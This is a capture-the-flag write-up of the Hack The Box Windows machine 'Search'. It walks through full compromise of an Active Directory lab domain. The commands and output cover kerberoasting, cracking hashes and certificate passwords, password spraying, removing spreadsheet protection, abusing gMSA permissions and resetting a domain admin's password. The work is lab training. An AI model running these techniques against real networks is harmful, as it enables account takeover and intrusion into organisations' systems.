---
title: "[HTB] Search"
permalink: /writeups/htb/search/
excerpt: "Краткий разбор машины Search с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - powershell
  - enumeration
  - gmsa
---

---

{% include toc icon="cog" title="Search Solution" %}

The [Search](https://app.hackthebox.com/machines/search) machine has been created by [MrR3boot](https://app.hackthebox.com/users/13531). This is a **hard** Windows Machine with a strong focus on Active Directory enumeration and exploitation.  

If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
{: .text-justify}

![image-center](/images/htb/htb_search_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/). Note the **-sV** switch which enables *version detection* and allows Nmap to check its internal database to try to determine the service protocol, application name and version number.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -Pn -sV 10.129.227.156
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 09:25 EDT
Nmap scan report for 10.129.227.156
Host is up (0.014s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-28 13:25:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.69 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

This machine is a domain controller for **search.htb**. We also have a couple of web-related port **HTTP** (80/TCP) and **HTTPS** (443/TCP).

## HTTP-разведка

Let's check this website, but before, we will add the domain to our `/etc/hosts` file with the following command:
- `echo "10.129.227.156 search.htb" | sudo tee --append /etc/hosts`

First, let's do a quick enumeration using [gobuster](https://github.com/OJ/gobuster) and see if we can find interesting files or directories.

```bash
$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -k -u https://search.htb
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://search.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/28 09:32:21 Starting gobuster in directory enumeration mode
===============================================================
/certenroll           (Status: 301) [Size: 153] [--> https://search.htb/certenroll/]
/certsrv              (Status: 401) [Size: 1293]
/css                  (Status: 301) [Size: 146] [--> https://search.htb/css/]
/fonts                (Status: 301) [Size: 148] [--> https://search.htb/fonts/]
/images               (Status: 301) [Size: 149] [--> https://search.htb/images/]
/Images               (Status: 301) [Size: 149] [--> https://search.htb/Images/]
/index.html           (Status: 200) [Size: 44982]
/js                   (Status: 301) [Size: 145] [--> https://search.htb/js/]
Progress: 4614 / 4615 (99.98%)
[ERROR] 2023/04/28 09:32:52 [!] Get "https://search.htb/staff": local error: tls: no renegotiation
===============================================================
2023/04/28 09:32:52 Finished
===============================================================
```

Interesting, we have **/certenroll** and **/certsrv** web pages which indicate that the Certification Authority (CA) Web Enrollment interface is enabled. 

Also, it seems that we have a **/staff** web page, which is inaccessible at the moment.

![image-center](/images/htb/htb_search_staff_denied.png){: .align-center}

By looking closely at the pictures present on the website, we found a potential password for Hope Sharp (`IsolationIsKey?`)

![image-center](/images/htb/htb_search_pass.png){: .align-center}

```bash
$ crackmapexec smb search.htb -u hope.sharp -p IsolationIsKey?
SMB         10.129.227.156  445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.156  445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey?
```

The credentials are valid, however, this account does not have remote access privileges on the box. Maybe we could try a **kerberoasting** attack to find another account.

# Первичный доступ

In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives. With the previously discovered account, let's see if we can execute a kerberoast attack.

## Kerberoasting

[Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) is an interesting technique that only requires a valid account on the targeted domain. Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any **SPN** from a domain controller. 

Portions of these tickets may be encrypted with the **RC4** algorithm, meaning the *Kerberos 5 TGS-REP etype 23* hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials.

Here, we can use [impacket-GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) to find Service Principal Names (SPN) that are associated with a user account and request a TGS.

```bash
$ impacket-GetUserSPNs search.htb/hope.sharp -dc-ip 10.129.227.156 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  <never>               

[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$5c0473f3881702bee09c6bde8a2fd6e8$dba927a9add7c9d49795b9f816afa8a70240c97c41184207634e85885304049a3ef0c7cd98a848a0008093bc80927e8d62442e0254f0cdc8295380abfd8125a2f0e07cfdf84d516e8cd7f7be285e037ce3a3d6c6f4a2aa22edc77f05ea92d418f7d5449a93edab167ec466d074847abaea1500da5d3622ce40939a2866935d05c5657e672c4ca8ffc9b218ebe0c5624b6c1ef43e205ef2c72a02fda101b99ab9c8eedc7a1ba6382c592c59e4c3cce00f7c6932ef05ecc8799118ad1e5a6cb4658cf11eb3f8ffc4a48259d2b08db73ff3037af0198df6645e235441537be0fe34c02c615b20daf8836dc3ac35bcbc1daf2be7a6e78363d48ea188811298eed899a232a6ea3c775fec3712b7d89cf731b0633ee0ef1b1d62470497e54d6c50ef7bdc6c6b8dedd08c3b0f5a6f932d30b05c88938133084f4904300f40fac63c48c83ef111d1fcb367b7d68aacce2bd5ff6b4661da044bd450ff96ab9613b54d25b7ece95eca2a8d0b87bdf85445a0a428a4f358f325f8c1bf9eafbce4cbaa4318b721e49c0148f936c94ccd5a966448b80803d7c4cea3652571c731ea8c9b4b98bdb46cdf8caa05ed603129e4d40722b484375cf47249d90fb5aefe0277e8f8c015e6361e6c71f9ae6beb958e2a5a1d9a6d45f9a1efcf6b8426c607502a7c6d43d84a6d4dd6de712cbc3c0b92bd12f070fcacfe77412c8741da28dee15853e9690dbcadb37cc3807270b5e2bc31d0a7c47b98295873d1472c101ec06603011f76c1abf5b33bb7661a71d249982d57f5f631c11826f2d8d2862a8d9a9bba64d0d94c9b30e9f345797b0d99dd644f3c9dcb6518fc6a7892c412579e741d7f3b04e228fe823d0e17d79dc2f7d9cb0992e3a6c039b48c7c3e4c4923141dafa88121b49acab44f6475edda3d27ca7df17d9101f48363bd998dce0c7658ffc5f2016bdac037c16de1a35ac4947641d6091ec9b7498d403ed084c313a4721c07dd321df3618a983da03e4b3d2b1532075fcb0acf3137245f0ad4ec32e63caea64d2d5d1010109138d9599089ab4fbcc94f91854402b88452060888d4d50977314b74a2f4278f28ed752c31aae8cd2fd3d0ce552f1a723d0792e79f47efb8a4ebe965037a639a6181baa33c090e784b7da04f5509d617405669551c4826fdf47e5594b8fb2f97468f26524dc283e268c637eaa9eda307dc0c13c94255c36c4e3b48fe3eb8c4b5f60b7c353020835a40708dfa0effc8e75106210da6b3e653c6ba8982479e87327843275a9c07643e9f59690db5fc3cd19eb3e5afc14ce66c04e76b6fca98582485f94f473208abf1a8ba4a98a90d049ff272dbc4919b7fba7d1cec432662ff23fcc07aaff8fa06f690f1f87e7b2a5b5ce6af78c97c3be8537f4947b6c82446bb1a8d5ec66a9f519c1c85fce75f2327ac4ec6164e7ecf5bbaabdc7ee69189b7cdfa84746f0c141363bf7ca1d89ad544b885ecd010
```

As we can see, the **web_svc** account is kerberoastable. Let's try to crack its password.

## Взлом пароля

We just have to crack the recovered hash offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt kerb_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, almost any other key for status
@3ONEmillionbaby (?)     
1g 0:00:00:20 DONE (2023-04-28 09:56) 0.04780g/s 549203p/s 549203c/s 549203C/s @421eduymayte619..@33croc
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Nice, we have a cracked the account's password. (`web_svc:@3ONEmillionbaby`). Let's see if this account is valid.

```bash
$ crackmapexec smb search.htb -u web_svc -p @3ONEmillionbaby
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         search.htb      445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby
```

Again, this account does not have any remote access on the targeted box. Let's keep looking around.

## LDAP

Here, we did an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch) to look for some information. With the `grep` command, we can look for the **userPrincipalName** attribute that specifies the UPN of the users.

```bash
$ ldapsearch -x -b "dc=search,dc=htb" "*" -H ldap://search.htb -D web_svc@search.htb -w '@3ONEmillionbaby' | grep userPrincipalName
userPrincipalName: Santino.Benjamin@search.htb
userPrincipalName: Payton.Harmon@search.htb
userPrincipalName: Trace.Ryan@search.htb
userPrincipalName: Reginald.Morton@search.htb
userPrincipalName: Eddie.Stevens@search.htb
userPrincipalName: Cortez.Hickman@search.htb
userPrincipalName: Chace.Oneill@search.htb
userPrincipalName: Abril.Suarez@search.htb
userPrincipalName: Savanah.Velazquez@search.htb
userPrincipalName: Antony.Russo@search.htb
userPrincipalName: Cameron.Melendez@search.htb
userPrincipalName: Edith.Walls@search.htb
userPrincipalName: Lane.Wu@search.htb
userPrincipalName: Arielle.Schultz@search.htb

...[snip]...
```

More usernames, we will try a password spraying later but first, let's see if **web_svc** has access to shared folders.

## Shared Folders

While **web_svc** does not have any remote access to the computer, using `crackmapexec` and the `--shares` switch, it was possible to list some shares accessible by this user.

```bash
$ crackmapexec smb search.htb -u web_svc -p @3ONEmillionbaby --shares
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         search.htb      445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby 
SMB         search.htb      445    RESEARCH         [+] Enumerated shares
SMB         search.htb      445    RESEARCH         Share           Permissions     Remark
SMB         search.htb      445    RESEARCH         -----           -----------     ------
SMB         search.htb      445    RESEARCH         ADMIN$                          Remote Admin
SMB         search.htb      445    RESEARCH         C$                              Default share
SMB         search.htb      445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         search.htb      445    RESEARCH         helpdesk                        
SMB         search.htb      445    RESEARCH         IPC$            READ            Remote IPC
SMB         search.htb      445    RESEARCH         NETLOGON        READ            Logon server share 
SMB         search.htb      445    RESEARCH         RedirectedFolders$ READ,WRITE      
SMB         search.htb      445    RESEARCH         SYSVOL          READ            Logon server share 
```

We have **READ** and **WRITE** access on *RedirectedFolders$*, let's see if there is anything interesting in it.

```bash
$ smbclient \\\\10.129.227.156\\RedirectedFolders$ -U web_svc@search.htb
Password for [web_svc@search.htb]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  Dc        0  Fri Apr 28 10:10:00 2023
  ..                                 Dc        0  Fri Apr 28 10:10:00 2023
  abril.suarez                       Dc        0  Tue Apr  7 14:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 09:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 08:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 14:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 08:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 14:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 09:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 08:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 14:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 07:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 16:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 08:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 14:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 14:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 10:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 14:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 09:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 16:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 07:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 14:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 08:21:42 2020
  sierra.frye                        Dc        0  Wed Nov 17 20:01:46 2021
  trace.ryan                         Dc        0  Thu Apr  9 16:14:26 2020

                3246079 blocks of size 4096. 589166 blocks available
```

Lots of folders, here we will download everything we can to save some time. Note that we used the `recurse` command to enable directory recursion for the command `mget` and `prompt off` to make sure that all specified files (if any) will be transferred without asking if we want to download them.

```bash
smb: \> prompt off
smb: \> recurse
smb: \> mget *
NT_STATUS_ACCESS_DENIED opening remote file \sierra.frye\user.txt
NT_STATUS_ACCESS_DENIED listing \abril.suarez\Desktop\*

...[snip]...
```

We can see the first flag in **sierra.frye** folder, but we can't read it. Let's try a password spraying attack with the usernames and passwords we found.

## Password spraying

As stated by [MITRE](https://attack.mitre.org/techniques/T1110/003/), adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password, or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.

Here we built a list of usernames and used it in a password spraying attack with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) to see if it yields any results.

```bash
$ crackmapexec smb search.htb -u users.txt -p pass.txt --continue-on-success
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)

...[snip]...

SMB         search.htb      445    RESEARCH         [-] search.htb\Marshall.Skinner:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [-] search.htb\Edgar.Jacobs:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         search.htb      445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby 

...[snip]...
```

Ok, we have another valid account (`Edgar.Jacobs:@3ONEmillionbaby`). 

Now, we can recheck the shared folder and see if this account has access to interesting files. Again, we will use `smbclient` and look into the **edgar.jacobs** folder.

```bash
$ smbclient \\\\10.129.227.156\\RedirectedFolders$ -U Edgar.Jacobs@search.htb
Password for [Edgar.Jacobs@search.htb]:
Try "help" to get a list of possible commands.
smb: \> cd edgar.jacobs\
smb: \edgar.jacobs\> ls
  .                                  Dc        0  Thu Apr  9 16:04:11 2020
  ..                                 Dc        0  Thu Apr  9 16:04:11 2020
  Desktop                           DRc        0  Mon Aug 10 06:02:16 2020
  Documents                         DRc        0  Mon Aug 10 06:02:17 2020
  Downloads                         DRc        0  Mon Aug 10 06:02:17 2020

                3246079 blocks of size 4096. 590572 blocks available
smb: \edgar.jacobs\> cd Desktop\
smb: \edgar.jacobs\Desktop\> ls
  .                                 DRc        0  Mon Aug 10 06:02:16 2020
  ..                                DRc        0  Mon Aug 10 06:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 06:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 16:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 06:35:44 2020

                3246079 blocks of size 4096. 590572 blocks available
smb: \edgar.jacobs\Desktop\> get Phishing_Attempt.xlsx 
getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as Phishing_Attempt.xlsx (332.2 KiloBytes/sec) (average 332.2 KiloBytes/sec)
```

Interesting, we have a file named **Phishing_Attempt.xlsx**. If we open the file we have a bunch of usernames, but the column containing the passwords is protected.

![image-center](/images/htb/htb_search_xlsx_locked.png){: .align-center}

Using the technique explained in this [post](https://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/) it was possible to bypass the password verification by modifying the file.

```bash
$ unzip Phishing_Attempt.xlsx 
Archive:  Phishing_Attempt.xlsx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/worksheets/sheet2.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: xl/drawings/drawing1.xml  
  inflating: xl/charts/chart1.xml    
  inflating: xl/charts/style1.xml    
  inflating: xl/charts/colors1.xml   
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/_rels/sheet2.xml.rels  
  inflating: xl/drawings/_rels/drawing1.xml.rels  
  inflating: xl/charts/_rels/chart1.xml.rels  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: xl/printerSettings/printerSettings2.bin  
  inflating: xl/calcChain.xml        
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
                                                                                                                                                                       
┌──(ax㉿null)-[~/phish]
└─$ sed -i 's/<sheetProtection[^>]*>//' xl/worksheets/sheet2.xml
                                                                                                                                                                       
┌──(ax㉿null)-[~/phish]
└─$ zip -fr Phishing_Attempt.xlsx *
freshening: xl/worksheets/sheet2.xml (deflated 73%)
                                                                                                                                                                       
┌──(ax㉿null)-[~/phish]
└─$ 
```

Once the file is repacked, the protected column should be visible.

![image-center](/images/htb/htb_search_xlsx_unlocked.png){: .align-center}

Lots of potentially valid passwords! But we will start with **sierra.frye** (`$$49=wide=STRAIGHT=jordan=28$$18`) as this user can read the **first flag**.

```bash
$ smbclient \\\\10.129.227.156\\RedirectedFolders$ -U Sierra.Frye@search.htb
Password for [Sierra.Frye@search.htb]:
Try "help" to get a list of possible commands.
smb: \> cd sierra.frye\
smb: \sierra.frye\> ls
  .                                  Dc        0  Wed Nov 17 20:01:46 2021
  ..                                 Dc        0  Wed Nov 17 20:01:46 2021
  Desktop                           DRc        0  Wed Nov 17 20:08:00 2021
  Documents                         DRc        0  Fri Jul 31 10:42:19 2020
  Downloads                         DRc        0  Fri Jul 31 10:45:36 2020
  user.txt                           Ac       33  Wed Nov 17 19:55:27 2021

                3246079 blocks of size 4096. 590080 blocks available
```

Awesome, **sierra.frye** also has some certificates in the **Backups** folder.

```bash
smb: \sierra.frye\> cd Downloads\
smb: \sierra.frye\Downloads\> ls
  .                                 DRc        0  Fri Jul 31 10:45:36 2020
  ..                                DRc        0  Fri Jul 31 10:45:36 2020
  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 14:04:01 2020
  Backups                           DHc        0  Mon Aug 10 16:39:17 2020
  desktop.ini                      AHSc      282  Fri Jul 31 10:42:18 2020

                3246079 blocks of size 4096. 590080 blocks available
smb: \sierra.frye\Downloads\> cd Backups\
smb: \sierra.frye\Downloads\Backups\> ls
  .                                 DHc        0  Mon Aug 10 16:39:17 2020
  ..                                DHc        0  Mon Aug 10 16:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 11:04:11 2020
  staff.pfx                          Ac     4326  Mon Aug 10 16:39:17 2020

                3246079 blocks of size 4096. 590080 blocks available
```

As the name of one of the certificates is **staff.pfx**, it may be a hint. These certificates could be the key to access the **/staff** folder we previously found. 

However, after trying to import them in a web browser, we discovered that the certificates were password protected.

![image-center](/images/htb/htb_search_cert_pass.png){: .align-center}

No big deal, using `pfx2john` we can recover the hash of the PFX file and try to crack it with a dictionary attack.

```bash
$ pfx2john staff.pfx > hash.pfx
```

As usual, we used the *rockyou* wordlist to attempt to crack the password.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.pfx 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:03:15 22.82% (ETA: 10:54:44) 0g/s 17803p/s 17803c/s 17803C/s superneha..supernatural=sexy
misspissy        (staff.pfx)     
1g 0:00:04:52 DONE (2023-04-28 10:45) 0.003413g/s 18721p/s 18721c/s 18721C/s misspluto3..misspinky08
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Ok, we have the password (`misspissy`). We can now import the certificates in our browser and try to access the **/staff** folder.

![image-center](/images/htb/htb_search_cert.png){: .align-center}

Here, the URL **https://search.htb/staff** will redirect us to a PowerShell Web Access login page. Using the `Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18` credentials we can try to connect to the remote machine.

![image-center](/images/htb/htb_search_webps.png){: .align-center}

Finally, we have a shell.

![image-center](/images/htb/htb_search_webps2.png){: .align-center}

## Разведка Active Directory

With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. 

Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Here, we used a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c DCOnly -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb -ns 10.129.227.156 --zip
INFO: Found AD domain: search.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: research.search.htb
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Connecting to LDAP server: research.search.htb
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 107 users
INFO: Found 64 groups
INFO: Found 6 gpos
INFO: Found 27 ous
INFO: Found 19 containers
INFO: Found 113 computers
INFO: Found 0 trusts
INFO: Done in 00M 29S
INFO: Compressing output into 20230428105127_bloodhound.zip
```

By looking at the BloodHound output, we can see that Sierra Frye is a member of the **BIRMINGHAM-ITSEC@SEACH.HTB** group and this specific group is part of the **ITSEC@SEARCH.HTB** group. 

The **ITSEC@SEARCH.HTB** have *ReadGMSAPassword* privileges on the **BIR-ADFS-GMSA@SEARCH.HTB**. We can abuse this weakness to read the gMSA (Group Managed Service Accounts) password of the account.

![image-center](/images/htb/htb_search_bh1.png){: .align-center}

Then, if we take a closer look at the **BIR-ADFS-GMSA@SEARCH.HTB** account, we can see that it has *GenericAll* privileges on the **TRISTAN.DAVIES@SEARCH.HTB** who is domain admin.

![image-center](/images/htb/htb_search_bh2.png){: .align-center}

Next step, privilege escalation.

# Повышение привилегий

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Abuse ReadGMSAPassword

Like we saw earlier, according to **BloodHound**, **Sierra.Frye** is part of the **ITSEC** group and has *ReadGMSAPassword* permission on the **BIR-ADFS-GMSA@SEARCH.HTB** domain account.

Group Managed Service Accounts (GMSA) are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval. The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.

Once we recovered the password of the **BIR-ADFS-GMSA@SEARCH.HTB** account, we were able to change the password of **TRISTAN.DAVIES@SEARCH.HTB**.

![image-center](/images/htb/htb_search_gmsa.png){: .align-center}

Then, we can test if the password change we performed on **tristan.davies** worked.

```bash
$ crackmapexec smb search.htb -u tristan.davies -p 'P@ssw0rd!'
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         search.htb      445    RESEARCH         [+] search.htb\tristan.davies:P@ssw0rd! (Pwn3d!)
```

Finally, we just had to recover the **second flag** and finish the challenge.

```bash
$ crackmapexec smb search.htb -u tristan.davies -p 'P@ssw0rd!' -x "dir c:\Users\Administrator\Desktop" 
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         search.htb      445    RESEARCH         [+] search.htb\tristan.davies:P@ssw0rd! (Pwn3d!)
SMB         search.htb      445    RESEARCH         [+] Executed command 
SMB         search.htb      445    RESEARCH         Volume in drive C has no label.
SMB         search.htb      445    RESEARCH         Volume Serial Number is B8F8-6F48
SMB         search.htb      445    RESEARCH         
SMB         search.htb      445    RESEARCH         Directory of c:\Users\Administrator\Desktop
SMB         search.htb      445    RESEARCH         
SMB         search.htb      445    RESEARCH         22/11/2021  21:21    <DIR>          .
SMB         search.htb      445    RESEARCH         22/11/2021  21:21    <DIR>          ..
SMB         search.htb      445    RESEARCH         28/04/2023  14:21                34 root.txt
SMB         search.htb      445    RESEARCH         1 File(s)             34 bytes
SMB         search.htb      445    RESEARCH         2 Dir(s)   2,440,777,728 bytes free
```

Awesome! I hope you enjoyed it, I know I did :)
